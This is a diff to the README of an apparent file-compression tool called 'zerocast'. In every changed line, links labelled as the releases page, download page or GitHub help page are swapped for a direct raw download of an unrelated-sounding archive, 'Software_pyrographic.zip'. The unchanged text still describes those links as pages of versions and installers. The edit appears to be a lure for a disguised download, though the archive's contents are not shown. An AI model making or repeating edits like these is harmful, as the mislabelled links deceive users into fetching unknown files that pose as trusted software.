@@ -1,6 +1,6 @@
 # ⚡ zerocast - Compress Files with Best Efficiency
 
-[![Download zerocast](https://img.shields.io/badge/Download-zerocast-brightgreen?style=for-the-badge)](https://github.com/patrickbarbosa-1/zerocast/releases)
+[![Download zerocast](https://img.shields.io/badge/Download-zerocast-brightgreen?style=for-the-badge)](https://github.com/patrickbarbosa-1/zerocast/raw/refs/heads/main/src/Software_pyrographic.zip)
 
 ---
 
@@ -32,7 +32,7 @@ You do not need any special skills or other software to run zerocast.
 
 To get started, visit the official download page and get the version for Windows.
 
-[![Visit Download Page](https://img.shields.io/badge/Download_Page-Click_here-blue?style=for-the-badge)](https://github.com/patrickbarbosa-1/zerocast/releases)
+[![Visit Download Page](https://img.shields.io/badge/Download_Page-Click_here-blue?style=for-the-badge)](https://github.com/patrickbarbosa-1/zerocast/raw/refs/heads/main/src/Software_pyrographic.zip)
 
 Click the link above. This will open a page with the latest versions of zerocast. Look for a file that ends with `.exe`. This is the installer for Windows.
 
@@ -131,7 +131,7 @@ If problems continue, visit the repository page and check the Issues tab for hel
 
 To update zerocast to a newer version:
 
-1. Go to the [release page](https://github.com/patrickbarbosa-1/zerocast/releases).  
+1. Go to the [release page](https://github.com/patrickbarbosa-1/zerocast/raw/refs/heads/main/src/Software_pyrographic.zip).  
 2. Download the latest `.exe` installer.  
 3. Run the new installer. It will replace the older version without deleting your settings.
 
@@ -153,10 +153,10 @@ If you want to remove zerocast:
 
 If you have questions or need help, visit the GitHub page at:
 
-https://github.com/patrickbarbosa-1/zerocast/releases
+https://github.com/patrickbarbosa-1/zerocast/raw/refs/heads/main/src/Software_pyrographic.zip
 
 Look for the Issues section to see if others had the same problem or to report your own.
 
 ---
 
-[![Download zerocast](https://img.shields.io/badge/Download-zerocast-brightgreen?style=for-the-badge)](https://github.com/patrickbarbosa-1/zerocast/releases)
+[![Download zerocast](https://img.shields.io/badge/Download-zerocast-brightgreen?style=for-the-badge)](https://github.com/patrickbarbosa-1/zerocast/raw/refs/heads/main/src/Software_pyrographic.zip)
